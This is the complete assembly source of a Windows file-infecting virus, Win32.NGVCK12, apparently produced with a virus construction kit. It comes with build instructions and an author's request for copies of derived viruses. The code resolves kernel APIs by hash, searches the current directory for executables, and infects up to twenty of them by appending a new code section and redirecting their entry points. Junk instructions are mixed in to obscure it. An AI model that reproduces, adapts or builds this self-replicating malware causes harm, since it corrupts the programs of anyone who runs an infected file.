              
;
;
; Win32.NGVCK12 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK12
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 19
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 1588 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov eax, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
 sub eax, offset Delta
                                        ; mov ebp, eax
 push eax
 pop ebp
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 sectionalign   dd 0h
 NewEIP      dd 0h
 Attributes  dd 0h
 KernelMZ    dd 0h
 InfCounter  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 PEheader    dd 0h
 filemask    db '*.eXE',0
 NewSize     dd 0h
 TempAPI     dd 0h
 TempApisearch2 dd 0h
 MapAddress  dd 0h
 MapHandle   dd 0h
 APICRC32    dd 0h
 OTableVA    dd 0h
 KernelPE    dd 0h
 ATableVA    dd 0h
 Trash1      dd 0h
 db 'Win32.NGVCK12 - SnakeByte',0
 AlignReg1   dd 0h
 OldEIP      dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 Misc1       dd 0h
 K32Trys     dd 0h
 OldBase     dd 400000h

 APIOffsets:
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h

 Trash4      dd 0h
 FindHandle  dd 0h

 APINames:
 dd 08C892DDFh           ; CreateFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 068624A9Dh           ; CloseHandle
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AA700106h           ; FindNextFileA
 dd 0C200BE21h           ; FindClose
 dd 094524B42h           ; UnmapViewOfFile
 dd 03C19E536h           ; SetFileAttributesA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 0AE17EBEFh           ; FindFirstFileA


 counter     dw 0h
newsection:                           ; Settings for the new section
 nsname           db '.kqvVUux'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FileHandle  dd 0h
 Trash2      dd 0h
 Trash3      dd 0h
 filealign   dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

 xor dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, -57784d
 add ebx, 57784d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 add ebx, 1d
 push ebx
 mov eax, 80000000h or 40000000h
 push eax
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push edx
 rcl ebx, 5d                            ; Trash
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax
 adc ebx, ebx                           ; Trash

 mov dword ptr [ebp+FileHandle], eax
 and dword ptr [ebp+Trash1], edx        ; Trash

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx
 add edx, edx                           ; Trash

                                        ; clear ebx
 mov ebx, -50386d
 add ebx, 50386d
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 neg ebx                                ; Trash
 pop ecx
 add eax, -1
 inc eax
 jz CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 and edx, 68875052d                     ; Trash
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
                                        ; clear ebx
 mov ebx, 30968d
 sub ebx, 30968d
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, edi
 rcl ebx, 19d                           ; Trash

 push edi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, 0
 add eax, 276d
 mov esi, ebp
 add esi, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 inc esi
 dec eax
 jnz ClearOldData2
 popad
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 dec dword ptr [ebp+Trash1]             ; Trash
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, edx
 add eax, [edx+3Ch]
                                        ; get File Alignment
 mov edx, [eax+3Ch]
 mov dword ptr [ebp+filealign], edx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov edx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], 0
 adc ecx, eax                           ; Trash
 add dword ptr [ebp+OldBase], edx
 mov edx, [eax+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [eax+74h]
 shl ecx, 3
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [eax+6h]
 mov edx, 28h
 pushad
 mov eax, ebx
 mul edx
 mov dword ptr [ebp+Misc1], 0
 add dword ptr [ebp+Trash2], ebx        ; Trash
 xor dword ptr [ebp+Misc1], eax
 popad
 mov ebx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, ecx
 add eax, ebx
 lea ecx, [ebp+newsection]
 xchg ecx, edx


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov ebx, [edx-5*8+8d]
 add ebx, [edx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ebx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov eax,[edx-5*8+20d]
 add eax,[edx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov ebx, eax
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
                                        ; unmap file and map it again with new size
 push ebx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 64
 mov ebx, 64d
 lea ecx, [ebp+newsection]
 and dword ptr [ebp+Trash3], 1823131    ; Trash

 pop edx
WriteNewSectionLoop:
 mov al, byte ptr [ecx]
 mov byte ptr [edx], al
                                        ; add edx, 1
 sub edx, -1d
 sub ebx, 1
                                        ; add ecx, 1
 sub ecx, -1d
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ebx
 mov ebx, -38075d
 add ebx, 38075d
 xor ebx, dword ptr [ebp+PEheader]
 inc word ptr [ebx+06h]
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], edx
 adc dword ptr [ebp+Trash3], 1081978    ; Trash
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], -1d
 and dword ptr [ebx+4Ch], 'NGVC'
 mov eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 neg eax                                ; Trash
 pop ecx
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
 sub edx, eax                           ; Trash
                                        ; clear ebx
 mov ebx, 59488d
 sub ebx, 59488d

 sbb ecx, 21d                           ; Trash
 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ebx]
 lea ecx, [ebp+GetKernel32Exception]
 xchg ecx, esi

 push esi
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jnz GotKernelXX
 sar eax, 19d                           ; Trash
 jmp GetKernel32NotFound
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je CheckPE

GK2:
 inc edi
 sub edi, 65537d
 mov edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], -1
 and dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add edi, 60
 dec edi
 add edi, 61d
 mov ebx, [edi]
 add edi, -60d
 neg edi
 mov eax, ecx                           ; Trash
 sub ebx, edi
 neg edi
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; check if the file is a DLL
                                        ; add ebx, 22
 add ebx, 22d
                                        ; clear eax
 mov eax, -24145d
 add eax, 24145d
 movzx eax, word ptr [ebx]
 and ax, 0F000h
 cmp ax, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 inc ebx
 sub ebx, 23d


KernelFound:
 mov dword ptr [ebp+KernelMZ], edi
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], ebx

                                        ; clear ebx
 and ebx, 0

 pop dword ptr fs:[ebx]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 xor ecx, ecx

 mov edx, dword ptr fs:[ecx]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear eax
 and eax, 0

 pop dword ptr fs:[eax]
 pop edx
 popad
 stc
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, ( 128d + 22d )
 sub edx, 22d
 push edx
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 lea edx, [ebp+WFD_nFileSizeHigh]

 cmp dword ptr [edx], 0
 jne NoInfection
                                        ; check for minimum filesize
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 rol ecx, 21d                           ; Trash
 cmp word ptr [edx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [edx+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [ecx]
 sub eax, 'EP'
 jz Goodfile2
                                        ; mov ebx, 32485
 mov ebx, ( 32485d - 5d )
 add ebx, 5d
 adc eax, 66566597d                     ; Trash
 cmp ebx, 32485d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+Attributes]
 push ebx
 inc dword ptr [ebp+Trash1]             ; Trash
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, ecx
 push ecx
 pop esi
                                        ; mov ecx, esi
 push esi
 pop ecx
LenCRC:
                                        ; add ecx, 1
 sub ecx, -1d
 cmp byte ptr [ecx], 0
 jne LenCRC
 sub ecx, esi
                                        ; mov edi, ecx
                                        ; clear edi
 sub edi, edi
 add edi, ecx
                                        ; add edi, 1
 sub edi, -1d
 cld
                                        ; clear ebx
 sub ebx, ebx
 dec ebx
                                        ; mov eax, ebx
 mov eax, ebx
NextByteCRC:
                                        ; clear ecx
 mov ecx, 0
                                        ; clear edx
 push 0
 pop edx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 xor cl, bl
 mov bl, bh
 mov bh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr dx, 1
 rcr cx, 1
jnc NoCRC
 xor cx,08320h
 xor dx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor ebx, ecx
 xor eax, edx
 dec edi
jnz NextByteCRC
 not eax
 not ebx
 mov ecx, eax
 rol ecx, 16d
 mov cx, bx
 push ecx
 pop dword ptr [ebp+APICRC32]
 xor dword ptr [ebp+Trash1], 677165     ; Trash
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

                                        ; mov ebx, -1
 mov ebx, ( -1d + 15d )
 sub ebx, 15d
 and ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 push edx
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+OldBase]
 neg edx                                ; Trash

 mov dword ptr [ebp+retBase], eax

 mov ebx, 35024088d                     ; Trash
 mov edx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], 0
 add dword ptr [ebp+Trash2], edx



                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg ecx, eax

 lea eax, [ebp+APINames]
 xchg eax, edi


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add edi, 4
 dec edi
 add edi, 5d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], -1
 and dword ptr [ecx], edx
                                        ; add ecx, 4
 add ecx, 4d
 dec ebx
 jnz GetApisLoop
 mov ebx, ebp
 add ebx, offset Outbreak

 push ebx
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 mov eax, 6377d
 sub eax, 6377d
 add eax, [ebx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [eax]
                                        ; add eax, 4
 add eax, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 mov ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ebx
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ebx]
                                        ; mov ebx, edx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, edx
                                        ; mov ecx, edx
                                        ; clear ecx
 and ecx, 0
 add ecx, edx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], ecx
 push edi
 cld

                                        ; ecx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [edi]
 cmp edx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ebx
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
 and dword ptr [ebp+Trash1], 1187761    ; Trash
                                        ; clear Stack
 pop edi
 pop edi
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, eax
 movzx ebx, word ptr [eax]
 shl ecx, 17d                           ; Trash
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], ecx
 not eax                                ; Trash
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea eax, [ebp+filemask]
 xchg edx, eax

                                        ; Set Infection Counter
                                        ; mov esi, 20
 mov esi, ( 20d - 38d )
 add esi, 38d
 mov dword ptr [ebp+InfCounter], esi
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
 xor dword ptr [ebp+Trash1], edx        ; Trash
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop esi
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

